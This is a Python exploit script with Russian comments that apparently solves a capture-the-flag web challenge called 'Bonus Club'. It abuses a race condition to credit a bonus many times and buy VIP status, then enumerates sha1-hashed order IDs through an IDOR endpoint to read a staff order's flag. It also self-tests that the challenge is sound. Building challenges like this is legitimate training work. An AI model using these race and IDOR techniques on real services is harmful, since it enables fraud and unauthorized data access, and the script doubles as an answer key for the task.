#!/usr/bin/env python3
"""Эксплойт для Bonus Club.

Киллчейн:
  1. Регистрация.
  2. Race condition на POST /api/bonus (окно ~125 мс между проверкой claim
     и INSERT) — параллельные запросы зачисляют бонус многократно.
  3. Покупка VIP-статуса (400 pt) — открывает доступ к legacy API v1.
  4. IDOR: GET /api/v1/orders/<oid> проверяет только VIP, но не владельца.
     Идентификаторы заказов непрозрачные: oid = sha1(str(internal_id)),
     поэтому перебирается числовой диапазон id с вычислением хешей;
     служебный заказ staff (internal id = 228) содержит флаг.

Перед гонкой выполняются негативные проверки честности (отдельный аккаунт):
одиночный повтор бонуса -> 409, v1 без VIP -> 403, чужой заказ через v2 -> 403,
числовой id и мусорный oid не принимаются.

Запуск:  python3 solve.py http://127.0.0.1:8080
"""

import argparse
import hashlib
import re
import sys
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import requests

FLAG_RE = re.compile(r"(?i)\b[a-z0-9_]{2,32}\{[^{}\s]{4,}\}")
VIP_PRICE = 400
RACE_THREADS = 32
MAX_ATTEMPTS = 5
ID_RANGE = 500


def oid(internal_id: int) -> str:
    return hashlib.sha1(str(internal_id).encode()).hexdigest()


def register(base: str) -> requests.Session:
    s = requests.Session()
    login = "pwn_" + uuid.uuid4().hex[:10]
    password = "Passw0rd!" + uuid.uuid4().hex[:6]
    r = s.post(f"{base}/api/register", json={"login": login, "password": password}, timeout=10)
    r.raise_for_status()
    return s


def balance(base: str, s: requests.Session) -> int:
    return s.get(f"{base}/api/me", timeout=10).json()["balance"]


def race_bonus(base: str, s: requests.Session, threads: int = RACE_THREADS) -> tuple[int, int]:
    """Параллельные запросы бонуса на одну сессию; возвращает (200, 409)."""
    token = s.cookies.get("club_session")
    barrier = threading.Barrier(threads)

    def fire(_: int) -> int:
        barrier.wait()
        sess = requests.Session()
        sess.cookies.set("club_session", token)
        try:
            return sess.post(f"{base}/api/bonus", timeout=20).status_code
        except requests.RequestException:
            return -1

    with ThreadPoolExecutor(max_workers=threads) as ex:
        codes = list(ex.map(fire, range(threads)))
    return codes.count(200), codes.count(409)


def selftest_pre(base: str) -> bool:
    """Негативные проверки: без гонки и без VIP коротких путей нет."""
    ok = True
    s = register(base)

    r1 = s.post(f"{base}/api/bonus", timeout=20)
    r2 = s.post(f"{base}/api/bonus", timeout=20)

    def check(name: str, cond: bool) -> None:
        nonlocal ok
        print(f"    [{'ok' if cond else 'FAIL'}] {name}")
        ok = ok and cond

    check(f"первый бонус 200 ({r1.status_code})", r1.status_code == 200)
    check(f"повторный бонус 409 ({r2.status_code})", r2.status_code == 409)

    staff_oid = oid(228)
    v1 = s.get(f"{base}/api/v1/orders/{staff_oid}", timeout=10)
    check(f"/api/v1/orders/{{sha1(228)}} без VIP 403 ({v1.status_code})", v1.status_code == 403)

    v2 = s.get(f"{base}/api/orders/{staff_oid}", timeout=10)
    check(f"/api/orders/{{sha1(228)}} (чужой) 403 ({v2.status_code})", v2.status_code == 403)

    num = s.get(f"{base}/api/v1/orders/228", timeout=10)
    check(f"числовой id 228 без VIP не пропускается ({num.status_code})", num.status_code == 403)

    junk = s.get(f"{base}/api/v1/orders/{'a' * 40}", timeout=10)
    check(f"несуществующий oid без VIP не пропускается ({junk.status_code})", junk.status_code == 403)

    public = Path(__file__).resolve().parent.parent / "public"
    if public.is_dir():
        leaked = []
        for p in public.rglob("*"):
            if not p.is_file() or p.suffix == ".pyc":
                continue
            try:
                text = p.read_text(errors="ignore")
                if re.search(r"(?i)\b[a-z0-9_]{2,32}\{[^{}\s]{4,}\}", text):
                    leaked.append(str(p))
            except OSError:
                pass
        check(f"флага в public/ нет ({len(leaked)} файлов)", not leaked)

    return ok


def exploit(base: str, threads: int = RACE_THREADS) -> str | None:
    for attempt in range(1, MAX_ATTEMPTS + 1):
        s = register(base)
        print(f"[{attempt}] аккаунт создан, гонка за бонусом ({threads} потоков)...")
        granted, denied = race_bonus(base, s, threads)
        bal = balance(base, s)
        print(f"[{attempt}] зачислений: {granted}, отказов: {denied}, баланс: {bal}")
        if bal < VIP_PRICE:
            print(f"[{attempt}] баланс мал, повторяем на новом аккаунте")
            continue

        r = s.post(f"{base}/api/buy", json={"code": "vip", "quantity": 1}, timeout=10)
        r.raise_for_status()
        print(f"[{attempt}] VIP куплен, баланс: {balance(base, s)}")

        num = s.get(f"{base}/api/v1/orders/228", timeout=10)
        print(
            f"    [{'ok' if num.status_code in (400, 404) else 'FAIL'}] "
            f"числовой id 228 с VIP отклонён ({num.status_code})"
        )
        junk = s.get(f"{base}/api/v1/orders/{'a' * 40}", timeout=10)
        print(
            f"    [{'ok' if junk.status_code == 404 else 'FAIL'}] "
            f"несуществующий oid 404 ({junk.status_code})"
        )

        print(f"[{attempt}] перебор oid = sha1(id), id 1..{ID_RANGE} через /api/v1/orders...")
        found = 0
        for internal_id in range(1, ID_RANGE + 1):
            r = s.get(f"{base}/api/v1/orders/{oid(internal_id)}", timeout=10)
            if r.status_code != 200:
                continue
            found += 1
            order = r.json()
            m = FLAG_RE.search(order.get("note", "") or "")
            if m:
                print(
                    f"[{attempt}] заказ id={internal_id} oid={oid(internal_id)[:16]}… "
                    f"(owner={order.get('owner')}): награда найдена"
                )
                return m.group(0)
        print(f"[{attempt}] доступных заказов: {found}, флага среди них нет")
        return None
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("url", nargs="?", default="http://127.0.0.1:13405",
                        help="базовый URL (по умолчанию локальный инстанс на порту пакета)")
    parser.add_argument("--threads", type=int, default=RACE_THREADS)
    parser.add_argument("--skip-selftest", action="store_true")
    args = parser.parse_args()

    base = args.url.rstrip("/")

    print("[*] негативные проверки честности:")
    if not args.skip_selftest and not selftest_pre(base):
        print("[!] часть проверок не прошла — задание выглядит некорректным")
        sys.exit(2)

    print("[*] эксплойт:")
    flag = exploit(base, args.threads)
    if flag:
        print(f"\n[+] ФЛАГ: {flag}")
    else:
        print("\n[-] флаг не получен")
        sys.exit(1)


if __name__ == "__main__":
    main()
